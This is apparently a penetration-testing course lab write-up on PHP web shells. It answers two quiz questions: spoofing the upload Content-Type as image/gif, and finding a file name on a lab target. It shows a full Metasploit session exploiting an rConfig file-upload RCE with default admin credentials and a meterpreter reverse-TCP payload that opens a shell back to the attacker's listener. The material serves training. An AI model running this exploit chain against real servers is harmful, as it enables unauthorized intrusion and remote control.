# Section 15: PHP Web Shells

Module: 08. Shells & Payloads

---

## Questions & Answers

### 1. In the example shown, what must the Content-Type be changed to in order to successfully upload the web shell? (Format: .../... )


**Answer:** `image/gif`

---

### 2. Use what you learned from the module to gain a web shell. What is the file name of the gif in the /images/vendor directory on the target? (Format: xxxx.gif)

Context:
- Login with `admin:admin`
- Use this [POC](https://www.exploit-db.com/exploits/49665) to get RCE or use the Metasploit exploit
```bash
[msf](Jobs:0 Agents:0) >> use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(
linux/http/rconfig_vendors_auth_file_upload_rce) >> show options

Module options (exploit/linux/http/rconfig_vendors_auth_file_upload_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       Password of the admin account
   Proxies                     no        A proxy chain of format type:host:por
                                         t[,type:host:port][...]. Supported pr
                                         oxies: socks4, socks5, socks5h, http,
                                          sapni
   RHOSTS                      yes       The target host(s), see https://docs.
                                         metasploit.com/docs/using-metasploit/
                                         basics/using-metasploit.html
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connec
                                         tions
   SSLCert                     no        Path to a custom SSL certificate (def
                                         ault is randomly generated)
   TARGETURI  /                yes       The base path of the rConfig server
   URIPATH                     no        The URI to use for this exploit (defa
                                         ult is random)
   USERNAME   admin            yes       Username of the admin account
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to
                                       listen on. This must be an address on t
                                       he local machine or 0.0.0.0 to listen o
                                       n all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  213.163.198.39   yes       The listen address (an interface may be s
                                     pecified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   rConfig <= 3.9.6



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> set LHOST 10.10.15.239
LHOST => 10.10.15.239
[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> set RHOSTS 10.129.146.155
RHOSTS => 10.129.146.155
[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> exploit
[*] Started reverse TCP handler on 10.10.15.239:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'ugfmqfxqrvhk.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (42137 bytes) to 10.129.146.155
[+] Deleted ugfmqfxqrvhk.php
[*] Meterpreter session 1 opened (10.10.15.239:4444 -> 10.129.146.155:57994) at 2026-07-29 08:56:40 -0400

(Meterpreter 1)(/home/rconfig/www/images/vendor) > shell
Process 2482 created.
Channel 0 created.
id
uid=48(apache) gid=48(apache) groups=48(apache)
ls /images/vendor
ls: cannot access /images/vendor: No such file or directory
ls
ajax-loader.gif
cisco.jpg
juniper.jpg
```

**Answer:** `ajax-loader.gif`

---

[Back to Module Index](./README.md)
